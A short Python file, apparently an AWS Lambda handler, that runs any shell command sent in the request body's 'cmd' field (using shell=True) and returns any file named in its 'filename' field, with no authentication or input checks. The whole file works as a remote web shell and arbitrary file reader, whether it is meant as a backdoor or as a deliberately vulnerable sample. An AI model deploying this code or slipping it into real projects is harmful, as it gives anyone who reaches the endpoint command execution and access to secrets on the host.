import subprocess
import json

def handler(event, context):

    if 'cmd' in event['body']:
        output = subprocess.check_output(json.loads(event['body'])['cmd'], stderr=subprocess.STDOUT, shell=True)
        return {"statusCode": 200, "body": json.dumps(str(output))}

    if 'filename' in event['body']:
        with open(json.loads(event['body'])['filename']) as f:
            contents = f.read()
            return {"statusCode": 200, "body": json.dumps(contents)}

    return None
